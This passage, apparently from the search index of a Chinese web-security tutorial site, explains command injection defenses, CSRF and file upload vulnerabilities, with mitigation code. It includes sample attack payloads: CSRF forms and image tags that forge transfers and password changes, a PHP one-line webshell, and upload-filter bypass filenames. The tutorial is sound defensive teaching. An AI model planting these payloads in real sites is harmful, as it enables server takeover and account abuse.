\u6700\u5c0f\u6743\u9650\u539f\u5219","text":"<p>\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u65f6\u4f7f\u7528\u7684\u8d26\u6237\u5e94\u8be5\u53ea\u88ab\u6388\u4e88\u5b8c\u6210\u5176\u5de5\u4f5c\u6240\u9700\u7684\u6700\u5c0f\u6743\u9650\u3002\u907f\u514d\u4f7f\u7528root\u6216\u7ba1\u7406\u5458\u8d26\u6237\u8fd0\u884cWeb\u5e94\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"web-security/command-injection/#5","title":"5. \u8f93\u5165\u6e05\u7406\u548c\u8f6c\u4e49","text":"<p>\u5728\u65e0\u6cd5\u907f\u514d\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u9002\u5f53\u7684\u6e05\u7406\u548c\u8f6c\u4e49\u3002</p> <pre><code># \u4f7f\u7528shlex.quote\u8fdb\u884c\u547d\u4ee4\u8f6c\u4e49\nimport shlex\n\nuser_input = request.form['input']\nsafe_input = shlex.quote(user_input)\ncommand = f\"safe_command {safe_input}\"\n</code></pre>"},{"location":"web-security/command-injection/#6","title":"6. \u4f7f\u7528\u5bb9\u5668\u5316\u6216\u6c99\u7bb1\u73af\u5883","text":"<p>\u5c06\u53ef\u80fd\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u4ee3\u7801\u653e\u5728\u5bb9\u5668\u6216\u6c99\u7bb1\u73af\u5883\u4e2d\u8fd0\u884c\uff0c\u9650\u5236\u5176\u5bf9\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"web-security/command-injection/#_7","title":"\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u6c38\u8fdc\u4e0d\u8981\u76f4\u63a5\u6267\u884c\u7528\u6237\u8f93\u5165\uff1a\u907f\u514d\u5c06\u7528\u6237\u8f93\u5165\u76f4\u63a5\u4f20\u9012\u7ed9\u547d\u4ee4\u6267\u884c\u51fd\u6570</li> <li>\u4f7f\u7528\u767d\u540d\u5355\u9a8c\u8bc1\uff1a\u57fa\u4e8e\u767d\u540d\u5355\u9a8c\u8bc1\u8f93\u5165\uff0c\u800c\u4e0d\u662f\u9ed1\u540d\u5355</li> <li>\u4f7f\u7528\u53c2\u6570\u5316\u51fd\u6570\uff1a\u4f7f\u7528\u63a5\u53d7\u53c2\u6570\u5217\u8868\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</li> <li>\u5b9e\u65bd\u6700\u5c0f\u6743\u9650\u539f\u5219\uff1a\u4ee5\u6700\u5c0f\u5fc5\u8981\u6743\u9650\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f</li> <li>\u4f7f\u7528\u5e94\u7528\u7ea7\u9632\u706b\u5899\uff1a\u914d\u7f6eWeb\u5e94\u7528\u9632\u706b\u5899(WAF)\u6765\u68c0\u6d4b\u548c\u963b\u6b62\u547d\u4ee4\u6ce8\u5165\u653b\u51fb</li> <li>\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff1a\u4f7f\u7528\u5de5\u5177\u5982OWASP ZAP\u6216\u624b\u52a8\u6d4b\u8bd5\u6765\u53d1\u73b0\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e</li> </ol>"},{"location":"web-security/command-injection/#_8","title":"\u603b\u7ed3","text":"<p>\u547d\u4ee4\u6ce8\u5165\u662f\u4e00\u79cd\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u5b8c\u5168\u88ab\u63a7\u5236\u3002\u901a\u8fc7\u91c7\u7528\u9002\u5f53\u7684\u9632\u5fa1\u63aa\u65bd\uff0c\u5982\u907f\u514d\u76f4\u63a5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u4f7f\u7528\u767d\u540d\u5355\u9a8c\u8bc1\u3001\u9009\u62e9\u5b89\u5168\u7684\u51fd\u6570\u548cAPI\u7b49\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u9632\u6b62\u5927\u591a\u6570\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u3002\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\uff0c\u5e94\u5f53\u59cb\u7ec8\u5c06\u5b89\u5168\u653e\u5728\u9996\u4f4d\uff0c\u5bf9\u53ef\u80fd\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u7684\u64cd\u4f5c\u4fdd\u6301\u8b66\u60d5\u3002</p>"},{"location":"web-security/csrf/","title":"CSRF\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (Cross-Site Request Forgery)","text":""},{"location":"web-security/csrf/#csrf","title":"\u4ec0\u4e48\u662fCSRF\uff1f","text":"<p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0c\u7b80\u79f0CSRF\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8bf1\u5bfc\u7528\u6237\u5728\u5df2\u8ba4\u8bc1\u7684Web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884c\u975e\u9884\u671f\u7684\u64cd\u4f5c\u3002\u653b\u51fb\u8005\u901a\u8fc7\u6b3a\u9a97\u7528\u6237\u7684\u6d4f\u89c8\u5668\u5411\u76ee\u6807\u7ad9\u70b9\u53d1\u9001\u8bf7\u6c42\uff0c\u5229\u7528\u7528\u6237\u7684\u5df2\u8ba4\u8bc1\u72b6\u6001\u6765\u6267\u884c\u672a\u6388\u6743\u7684\u64cd\u4f5c\u3002</p>"},{"location":"web-security/csrf/#csrf_1","title":"CSRF\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>CSRF\u653b\u51fb\u7684\u6838\u5fc3\u662f\u5229\u7528\u7528\u6237\u7684\u5df2\u8ba4\u8bc1\u4f1a\u8bdd\u3002\u5f53\u7528\u6237\u767b\u5f55\u5230\u4e00\u4e2a\u53d7\u4fe1\u4efb\u7684\u7f51\u7ad9\u540e\uff0c\u5176\u6d4f\u89c8\u5668\u4e2d\u4f1a\u4fdd\u5b58\u8be5\u7f51\u7ad9\u7684\u8ba4\u8bc1Cookie\u3002\u5982\u679c\u8be5\u7f51\u7ad9\u6ca1\u6709\u5b9e\u65bd\u9002\u5f53\u7684CSRF\u9632\u62a4\u63aa\u65bd\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6b3a\u9a97\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u7cbe\u5fc3\u6784\u9020\u8bf7\u6c42\u7684\u9875\u9762\uff0c\u8ba9\u6d4f\u89c8\u5668\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u4fdd\u5b58\u7684\u8ba4\u8bc1Cookie\u5411\u76ee\u6807\u7f51\u7ad9\u53d1\u9001\u8bf7\u6c42\u3002</p>"},{"location":"web-security/csrf/#csrf_2","title":"CSRF\u653b\u51fb\u7684\u7279\u70b9","text":"<ol> <li>\u653b\u51fb\u8005\u65e0\u6cd5\u76f4\u63a5\u83b7\u53d6\u7528\u6237\u7684Cookie\uff1aCSRF\u653b\u51fb\u4e0d\u4f1a\u7a83\u53d6\u7528\u6237\u7684\u6570\u636e\uff0c\u800c\u662f\u5229\u7528\u7528\u6237\u7684\u5df2\u8ba4\u8bc1\u72b6\u6001\u6267\u884c\u64cd\u4f5c\u3002</li> <li>\u9700\u8981\u7528\u6237\u4e3b\u52a8\u8bbf\u95ee\u653b\u51fb\u9875\u9762\uff1a\u653b\u51fb\u8005\u9700\u8981\u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u6216\u8bbf\u95ee\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u3002</li> <li>\u653b\u51fb\u6210\u529f\u4f9d\u8d56\u4e8e\u76ee\u6807\u7ad9\u70b9\u7f3a\u4e4fCSRF\u4fdd\u62a4\uff1a\u5982\u679c\u76ee\u6807\u7ad9\u70b9\u5b9e\u65bd\u4e86\u9002\u5f53\u7684CSRF\u4fdd\u62a4\u63aa\u65bd\uff0c\u653b\u51fb\u5c06\u65e0\u6cd5\u6210\u529f\u3002</li> </ol>"},{"location":"web-security/csrf/#csrf_3","title":"CSRF\u653b\u51fb\u793a\u4f8b","text":""},{"location":"web-security/csrf/#_1","title":"\u94f6\u884c\u8f6c\u8d26\u573a\u666f","text":"<p>\u5047\u8bbe\u4e00\u4e2a\u94f6\u884c\u7f51\u7ad9\u7684\u8f6c\u8d26\u529f\u80fd\u4f7f\u7528\u4ee5\u4e0bHTTP\u8bf7\u6c42\uff1a</p> <pre><code>POST /transfer HTTP/1.1\nHost: bank.example.com\nCookie: sessionid=abc123\n\namount=1000&amp;destination=attacker_account\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\u7684\u6076\u610f\u9875\u9762\uff1a</p> <pre><code>&lt;img src=\"http://bank.example.com/transfer?amount=1000&amp;destination=attacker_account\" style=\"display:none\"&gt;\n</code></pre> <p>\u5f53\u5df2\u767b\u5f55\u94f6\u884c\u7f51\u7ad9\u7684\u7528\u6237\u8bbf\u95ee\u8fd9\u4e2a\u6076\u610f\u9875\u9762\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u5411\u94f6\u884c\u7f51\u7ad9\u53d1\u9001\u8bf7\u6c42\uff0c\u7531\u4e8e\u8bf7\u6c42\u5305\u542b\u7528\u6237\u7684\u8ba4\u8bc1Cookie\uff0c\u94f6\u884c\u7f51\u7ad9\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u7528\u6237\u7684\u5408\u6cd5\u64cd\u4f5c\u5e76\u6267\u884c\u8f6c\u8d26\u3002</p>"},{"location":"web-security/csrf/#_2","title":"\u66f4\u6539\u5bc6\u7801\u573a\u666f","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u81ea\u52a8\u63d0\u4ea4\u7684\u8868\u5355\uff0c\u4fee\u6539\u7528\u6237\u7684\u5bc6\u7801\uff1a</p> <pre><code>&lt;form id=\"csrf-form\" action=\"http://example.com/change-password\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"new_password\" value=\"attacker_password\"&gt;\n    &lt;input type=\"hidden\" name=\"confirm_password\" value=\"attacker_password\"&gt;\n&lt;/form&gt;\n&lt;script&gt;\n    document.getElementById('csrf-form').submit();\n&lt;/script&gt;\n</code></pre>"},{"location":"web-security/csrf/#csrf_4","title":"CSRF\u7684\u9632\u5fa1\u63aa\u65bd","text":""},{"location":"web-security/csrf/#1-csrftoken","title":"1. \u5b9e\u65bdCSRF\u4ee4\u724c\uff08Token\uff09","text":"<p>\u8fd9\u662f\u9632\u5fa1CSRF\u6700\u6709\u6548\u7684\u65b9\u6cd5\u4e4b\u4e00\u3002\u670d\u52a1\u5668\u4e3a\u6bcf\u4e2a\u7528\u6237\u4f1a\u8bdd\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u4ee4\u724c\uff0c\u5e76\u5c06\u5176\u5d4c\u5165\u5230\u9875\u9762\u4e2d\u6216\u5b58\u50a8\u5728Cookie\u4e2d\u3002\u5f53\u7528\u6237\u63d0\u4ea4\u8868\u5355\u6216\u53d1\u9001\u8bf7\u6c42\u65f6\uff0c\u9700\u8981\u540c\u65f6\u63d0\u4ea4\u8fd9\u4e2a\u4ee4\u724c\u3002\u670d\u52a1\u5668\u9a8c\u8bc1\u4ee4\u724c\u7684\u6709\u6548\u6027\uff0c\u53ea\u6709\u4ee4\u724c\u6709\u6548\u624d\u5904\u7406\u8bf7\u6c42\u3002</p> <p>\u5b9e\u73b0\u793a\u4f8b\uff08\u4f7f\u7528Flask\uff09\uff1a</p> <pre><code>from flask import Flask, render_template, request, session\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = 'your_secret_key'\n\ndef generate_csrf_token():\n    if '_csrf_token' not in session:\n        session['_csrf_token'] = secrets.token_hex(16)\n    return session['_csrf_token']\n\napp.jinja_env.globals['csrf_token'] = generate_csrf_token\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrf_token')\n    if not token or token != session.get('_csrf_token'):\n        return 'CSRF token validation failed', 403\n    # \u5904\u7406\u8f6c\u8d26\u903b\u8f91\n    return 'Transfer successful'\n</code></pre> <p>\u6a21\u677f\u4e2d\u7684\u8868\u5355\uff1a</p> <pre><code>&lt;form action=\"/transfer\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\"&gt;\n    &lt;input type=\"text\" name=\"amount\" placeholder=\"Amount\"&gt;\n    &lt;input type=\"text\" name=\"destination\" placeholder=\"Destination\"&gt;\n    &lt;button type=\"submit\"&gt;Transfer&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"web-security/csrf/#2-refererorigin","title":"2. \u9a8c\u8bc1Referer\u548cOrigin\u5934","text":"<p>\u670d\u52a1\u5668\u53ef\u4ee5\u68c0\u67e5\u8bf7\u6c42\u7684Referer\u548cOrigin\u5934\uff0c\u786e\u4fdd\u8bf7\u6c42\u6765\u81ea\u53d7\u4fe1\u4efb\u7684\u57df\u3002</p> <pre><code>@app.route('/transfer', methods=['POST'])\ndef transfer():\n    referer = request.headers.get('Referer')\n    origin = request.headers.get('Origin')\n\n    # \u68c0\u67e5Referer\u6216Origin\u662f\u5426\u6765\u81ea\u4fe1\u4efb\u7684\u57df\n    trusted_domain = 'http://example.com'\n    if not (referer and referer.startswith(trusted_domain)) and not (origin and origin == trusted_domain):\n        return 'Invalid referer/origin', 403\n\n    # \u5904\u7406\u8f6c\u8d26\u903b\u8f91\n    return 'Transfer successful'\n</code></pre>"},{"location":"web-security/csrf/#3-samesite-cookie","title":"3. \u5b9e\u65bdSameSite Cookie\u5c5e\u6027","text":"<p>\u8bbe\u7f6eCookie\u7684SameSite\u5c5e\u6027\u53ef\u4ee5\u9650\u5236Cookie\u53ea\u5728\u540c\u6e90\u8bf7\u6c42\u4e2d\u53d1\u9001\uff0c\u6709\u6548\u9632\u6b62CSRF\u653b\u51fb\u3002</p> <pre><code>Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict\n</code></pre> <p>SameSite\u5c5e\u6027\u6709\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff1a - Strict\uff1aCookie\u53ea\u5728\u540c\u6e90\u8bf7\u6c42\u4e2d\u53d1\u9001 - Lax\uff1aCookie\u5728\u5bfc\u822a\u5230\u76ee\u6807URL\u7684GET\u8bf7\u6c42\u4e2d\u53d1\u9001\uff08\u9ed8\u8ba4\u503c\uff09 - None\uff1aCookie\u5728\u6240\u6709\u8bf7\u6c42\u4e2d\u53d1\u9001\uff0c\u4f46\u9700\u8981\u8bbe\u7f6eSecure\u5c5e\u6027</p>"},{"location":"web-security/csrf/#4","title":"4. \u8981\u6c42\u7528\u6237\u4ea4\u4e92","text":"<p>\u5bf9\u4e8e\u654f\u611f\u64cd\u4f5c\uff0c\u53ef\u4ee5\u8981\u6c42\u7528\u6237\u91cd\u65b0\u8f93\u5165\u5bc6\u7801\u6216\u63d0\u4f9b\u989d\u5916\u7684\u786e\u8ba4\u6b65\u9aa4\u3002</p>"},{"location":"web-security/csrf/#5-http","title":"5. \u4f7f\u7528\u81ea\u5b9a\u4e49HTTP\u5934","text":"<p>\u5bf9\u4e8eAJAX\u8bf7\u6c42\uff0c\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49HTTP\u5934\uff0c\u5982<code>X-Requested-With: XMLHttpRequest</code>\uff0c\u670d\u52a1\u5668\u9a8c\u8bc1\u8be5\u5934\u7684\u5b58\u5728\u3002</p>"},{"location":"web-security/csrf/#_3","title":"\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u4e3a\u6240\u6709\u72b6\u6001\u6539\u53d8\u7684\u64cd\u4f5c\u5b9e\u65bdCSRF\u4fdd\u62a4\uff1a\u7279\u522b\u662f\u6d89\u53ca\u6570\u636e\u4fee\u6539\u3001\u8d44\u91d1\u8f6c\u8d26\u3001\u5bc6\u7801\u66f4\u6539\u7b49\u654f\u611f\u64cd\u4f5c\u3002</li> <li>\u4f7f\u7528\u53cc\u91cd\u63d0\u4ea4Cookie\u6a21\u5f0f\uff1a\u5c06CSRF\u4ee4\u724c\u540c\u65f6\u5b58\u50a8\u5728Cookie\u548c\u8868\u5355\u4e2d\uff0c\u670d\u52a1\u5668\u9a8c\u8bc1\u4e24\u8005\u662f\u5426\u5339\u914d\u3002</li> <li>\u4fdd\u6301\u4ee4\u724c\u7684\u552f\u4e00\u6027\u548c\u968f\u673a\u6027\uff1a\u6bcf\u4e2a\u4f1a\u8bdd\u751f\u6210\u4e0d\u540c\u7684\u4ee4\u724c\uff0c\u4f7f\u7528\u5f3a\u968f\u673a\u6570\u751f\u6210\u5668\u3002</li> <li>\u8bbe\u7f6e\u9002\u5f53\u7684Cookie\u5c5e\u6027\uff1a\u4f7f\u7528HttpOnly\u3001Secure\u548cSameSite\u5c5e\u6027\u589e\u5f3aCookie\u5b89\u5168\u6027\u3002</li> <li>\u5b9e\u65bd\u591a\u5c42\u6b21\u9632\u5fa1\uff1a\u7ed3\u5408\u591a\u79cdCSRF\u9632\u5fa1\u63aa\u65bd\uff0c\u63d0\u9ad8\u5b89\u5168\u6027\u3002</li> </ol>"},{"location":"web-security/csrf/#_4","title":"\u603b\u7ed3","text":"<p>CSRF\u662f\u4e00\u79cd\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u8fdb\u884c\u9632\u5fa1\u3002\u5b9e\u65bdCSRF\u4ee4\u724c\u3001\u9a8c\u8bc1Referer\u548cOrigin\u5934\u3001\u8bbe\u7f6eSameSite Cookie\u5c5e\u6027\u7b49\u63aa\u65bd\u53ef\u4ee5\u6709\u6548\u5730\u4fdd\u62a4Web\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7CSRF\u653b\u51fb\u3002\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\uff0c\u5e94\u5f53\u5bf9\u6240\u6709\u53ef\u80fd\u6539\u53d8\u5e94\u7528\u72b6\u6001\u7684\u64cd\u4f5c\u5b9e\u65bd\u9002\u5f53\u7684CSRF\u4fdd\u62a4\u3002</p>"},{"location":"web-security/file-upload/","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e (File Upload Vulnerabilities)","text":""},{"location":"web-security/file-upload/#_1","title":"\u4ec0\u4e48\u662f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff1f","text":"<p>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307Web\u5e94\u7528\u7a0b\u5e8f\u5728\u5904\u7406\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u65f6\u5b58\u5728\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u5230\u670d\u52a1\u5668\u3002\u8fd9\u4e9b\u6076\u610f\u6587\u4ef6\u53ef\u80fd\u5305\u542bWebShell\u3001\u75c5\u6bd2\u3001\u540e\u95e8\u7a0b\u5e8f\u7b49\uff0c\u4ece\u800c\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u63a7\u5236\u3001\u6570\u636e\u6cc4\u9732\u6216\u5176\u4ed6\u5b89\u5168\u95ee\u9898\u3002</p>"},{"location":"web-security/file-upload/#_2","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u901a\u5e38\u53d1\u751f\u5728\u4ee5\u4e0b\u60c5\u51b5\uff1a 1. \u5e94\u7528\u7a0b\u5e8f\u672a\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b\u3001\u5927\u5c0f\u3001\u5185\u5bb9\u8fdb\u884c\u4e25\u683c\u9a8c\u8bc1 2. \u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b58\u50a8\u5728\u53ef\u88abWeb\u8bbf\u95ee\u7684\u76ee\u5f55\u4e2d 3. \u5e94\u7528\u7a0b\u5e8f\u672a\u5bf9\u6587\u4ef6\u8fdb\u884c\u9002\u5f53\u7684\u5904\u7406\u6216\u8f6c\u4e49 4. \u670d\u52a1\u5668\u914d\u7f6e\u4e0d\u5f53\uff0c\u5141\u8bb8\u6267\u884c\u4e0a\u4f20\u76ee\u5f55\u4e2d\u7684\u811a\u672c\u6587\u4ef6</p>"},{"location":"web-security/file-upload/#_3","title":"\u5e38\u89c1\u7684\u6587\u4ef6\u4e0a\u4f20\u653b\u51fb\u7c7b\u578b","text":""},{"location":"web-security/file-upload/#1-webshell","title":"1. WebShell\u4e0a\u4f20","text":"<p>\u653b\u51fb\u8005\u4e0a\u4f20\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u811a\u672c\u6587\u4ef6\uff08\u5982PHP\u3001ASP\u3001JSP\u7b49\uff09\uff0c\u5f53\u8fd9\u4e9b\u6587\u4ef6\u88ab\u8bbf\u95ee\u65f6\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u3002</p> <p>\u793a\u4f8b\uff08PHP WebShell\uff09\uff1a <pre><code>&lt;?php @eval($_POST['cmd']); ?&gt;  // \u7b80\u5355\u7684PHP\u4e00\u53e5\u8bdd\u6728\u9a6c\n</code></pre></p>"},{"location":"web-security/file-upload/#2","title":"2. \u7c7b\u578b\u6df7\u6dc6\u653b\u51fb","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7\u4fee\u6539\u6587\u4ef6\u6269\u5c55\u540d\u6216MIME\u7c7b\u578b\u6765\u7ed5\u8fc7\u6587\u4ef6\u7c7b\u578b\u9a8c\u8bc1\u3002</p> <p>\u5e38\u89c1\u7684\u7ed5\u8fc7\u65b9\u5f0f\uff1a - \u4f7f\u7528\u53cc\u91cd\u6269\u5c55\u540d\uff1a<code>shell.php.jpg</code>\uff08\u5982\u679c\u670d\u52a1\u5668\u53ea\u68c0\u67e5\u6700\u540e\u7684\u6269\u5c55\u540d\uff09 - \u4f7f\u7528\u7a7a\u683c\u6216\u7279\u6b8a\u5b57\u7b26\uff1a<code>shell.php%00.jpg</code>\uff08\u5229\u7528\u7a7a\u5b57\u8282\u622a\u65ad\uff09 - \u4fee\u6539Content-Type\u5934\uff1a\u5c06MIME\u7c7b\u578b\u6539\u4e3a<code>image/jpeg</code>\u6216<code>application/octet-stream</code></p>"},{"location":"web-security/file-upload/#3","title":"3. \u76ee\u5f55\u904d\u5386\u653b\u51fb","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7\u5728\u6587\u4ef6\u540d\u4e2d\u5305\u542b\u8def\u5f84\u904d\u5386\u5b57\u7b26\uff08\u5982<code>../</code>\uff09\uff0c\u5c1d\u8bd5\u5c06\u6587\u4ef6\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7684\u5176\u4ed6\u76ee\u5f55\u3002</p>"},{"location":"web-security/file-upload/#4","title":"4. \u6587\u4ef6\u8986\u76d6\u653b\u51fb","text":"<p>\u653b\u51fb\u8005\u5c1d\u8bd5\u4e0a\u4f20\u4e0e\u670d\u52a1\u5668\u4e0a\u73b0\u6709\u6587\u4ef6\u540c\u540d\u7684\u6587\u4ef6\uff0c\u8986\u76d6\u5173\u952e\u7cfb\u7edf\u6587\u4ef6\u6216\u914d\u7f6e\u6587\u4ef6\u3002</p>"},{"location":"web-security/file-upload/#5","title":"5. \u6076\u610f\u6587\u4ef6\u4f2a\u88c5","text":"<p>\u653b\u51fb\u8005\u5c06\u6076\u610f\u4ee3\u7801\u9690\u85cf\u5728\u770b\u4f3c\u6b63\u5e38\u7684\u6587\u4ef6\u4e2d\uff0c\u5982\u56fe\u7247\u6587\u4ef6\uff08\u56fe\u50cf\u9690\u5199\u672f\uff09\u3002</p> <p>\u793a\u4f8b\uff08\u56fe\u7247\u4e2d\u5d4c\u5165PHP\u4ee3\u7801\uff09\uff1a <pre><code>GIF89a&lt;?php phpinfo(); ?&gt;\n</code></pre></p>"},{"location":"web-security/file-upload/#_4","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u9632\u5fa1\u63aa\u65bd","text":""},{"location":"web-security/file-upload/#1","title":"1. \u4e25\u683c\u7684\u6587\u4ef6\u7c7b\u578b\u9a8c\u8bc1","text":"<p>\u5b9e\u65bd\u591a\u5c42\u6b21\u7684\u6587\u4ef6\u7c7b\u578b\u9a8c\u8bc1\uff1a</p> <ul> <li>\u68c0\u67e5\u6587\u4ef6\u6269\u5c55\u540d\uff1a\u7ef4\u62a4\u5141\u8bb8\u7684\u6587\u4ef6\u6269\u5c55\u540d\u767d\u540d\u5355</li> <li>\u9a8c\u8bc1MIME\u7c7b\u578b\uff1a\u68c0\u67e5Content-Type\u5934\uff0c\u4f46\u4e0d\u8981\u4ec5\u4f9d\u8d56\u4e8e\u6b64</li> <li>\u68c0\u67e5\u6587\u4ef6\u7b7e\u540d\uff08\u9b54\u672f\u5b57\u8282\uff09\uff1a\u9a8c\u8bc1\u6587\u4ef6\u7684\u5b9e\u9645\u5185\u5bb9\u7c7b\u578b</li> </ul> <pre><code># Python\u4e2d\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u7684\u793a\u4f8b\nimport os\nimport magic  # \u9700\u8981\u5b89\u88c5python-magic\u5e93\n\ndef validate_file_type(file_path, allowed_types):\n    # \u68c0\u67e5\u6587\u4ef6\u6269\u5c55\u540d\n    ext = os.path.splitext(file_path)[1].lower()\n    if ext not in allowed_types['extensions']:\n        return False\n\n    # \u68c0\u67e5\u6587\u4ef6\u9b54\u672f\u5b57\u8282\n    mime = magic.Magic(mime=True)\n    file_mime = mime.from_file(file_path)\n    if file_mime not in allowed_types['mimes']:\n        return False\n\n    return True\n</code></pre>"},{"location":"web-security/file-upload/#2_1","title":"2. \u6587\u4ef6\u5185\u5bb9\u68c0\u67e5","text":"<p>\u626b\u63cf\u4e0a\u4f20\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u786e\u4fdd\u4e0d\u5305\u542b\u6076\u610f\u4ee3\u7801\uff1a</p> <ul> <li>\u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u6216\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u5de5\u5177</li> <li>\u5bf9\u811a\u672c\u6587\u4ef6\u8fdb\u884c\u8bed\u6cd5\u5206\u6790</li> <li>\u79fb\u9664\u6216\u7981\u7528\u6587\u4ef6\u4e2d\u7684\u53ef\u6267\u884c\u4ee3\u7801</li> </ul>"},{"location":"web-security/file-upload/#3_1","title":"3. \u5b89\u5168\u7684\u6587\u4ef6\u5b58\u50a8","text":"<ul> <li>\u968f\u673a\u91cd\u547d\u540d\uff1a\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u751f\u6210\u968f\u673a\u6587\u4ef6\u540d\uff0c\u907f\u514d\u8def\u5f84\u904d\u5386\u548c\u6587\u4ef6\u8986\u76d6</li> <li>\u5b58\u50a8\u5728\u975eWeb\u8bbf\u95ee\u76ee\u5f55\uff1a\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u5b58\u50a8\u5728Web\u6839\u76ee\u5f55\u4e4b\u5916</li> <li>\u8bbe\u7f6e\u6b63\u786e\u7684\u6587\u4ef6\u6743\u9650\uff1a\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u6267\u884c\u6743\u9650</li> </ul> <pre><code># Python\u4e2d\u5b89\u5168\u7684\u6587\u4ef6\u5b58\u50a8\u793a\u4f8b\nimport os\nimport uuid\nfrom werkzeug.utils import secure_filename\n\ndef secure_file_upload(file, upload_folder):\n    # \u786e\u4fdd\u4e0a\u4f20\u76ee\u5f55\u5b58\u5728\n    if not os.path.exists(upload_folder):\n        os.makedirs(upload_folder)\n\n    # \u83b7\u53d6\u5b89\u5168\u7684\u6587\u4ef6\u540d\n    secure_name = secure_filename(file.filename)\n    # \u751f\u6210\u968f\u673a\u6587\u4ef6\u540d\n    ext = os.path.splitext(secure_name)[1]\n    random_name = str(uuid.uuid4()) + ext\n\n    # \u4fdd\u5b58\u6587\u4ef6\n    file_path = os.path.join(upload_folder, random_name)\n    file.save(file_path)\n\n    return random_name\n</code></pre>"},{"location":"web-security/file-upload/#4_1","title":"4. \u670d\u52a1\u5668\u914d\u7f6e\u5b89\u5168","text":"<ul> <li>\u7981\u7528\u4e0a\u4f20\u76ee\u5f55\u7684\u811a\u672c\u6267\u884c\uff1a\u5728Apache\u4e2d\u4f7f\u7528<code>.htaccess</code>\uff0c\u5728Nginx\u4e2d\u914d\u7f6e<code>location</code></li> <li>\u8bbe\u7f6e\u6587\u4ef6\u5927\u5c0f\u9650\u5236\uff1a\u9632\u6b62DoS\u653b\u51fb</li> 